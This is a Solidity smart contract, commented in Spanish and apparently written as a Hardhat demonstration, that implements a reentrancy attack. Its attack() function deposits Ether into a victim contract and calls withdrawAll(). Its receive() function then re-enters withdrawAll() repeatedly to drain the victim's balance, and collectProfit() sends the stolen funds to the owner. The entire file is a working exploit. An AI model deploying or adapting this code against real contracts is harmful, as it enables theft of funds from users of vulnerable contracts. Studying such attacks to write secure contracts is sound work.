// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "hardhat/console.sol";

contract Attacker {
    address payable public victim; // Almacenamos la dirección, no la interfaz 
    address public owner;

    constructor(address _victim) {
        victim = payable(_victim);
        owner = msg.sender;
    }

    // Iniciamos el ataque usando llamadas de bajo nivel 
    function attack() external payable {
        require(msg.value > 0, "Suministra Ether para el ataque");

        // 1. Llamada a deposit() con envío de Ether 
        (bool successDeposit, ) = victim.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(successDeposit, "Failed call to deposit."); 

        // 2. Llamada a withdrawAll() 
        (bool successWithdraw, ) = victim.call(
            abi.encodeWithSignature("withdrawAll()")
        );
        require(successWithdraw, "Failed call to withdrawAll."); 
    }

    // La reentrada también debe realizarse con una llamada de bajo nivel 
    receive() external payable {
        console.log("--- Reentrada detectada (Low-level call) ---");
        console.log("Saldo restante en la victima:", victim.balance);

        // Limitamos reentrada por balance y gas para evitar fallos 
        if (victim.balance >= msg.value && gasleft() > 10000) {
            (bool success, ) = victim.call(
                abi.encodeWithSignature("withdrawAll()")
            );
            require(success, "Failed reentrancy call to withdrawAll."); 
        }
    }

    // Recuperar el botín usando una transferencia plana de bajo nivel 
    function collectProfit() external {
        require(msg.sender == owner, "Only owner can collect profit.");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Failed to collect profit."); 
    }
}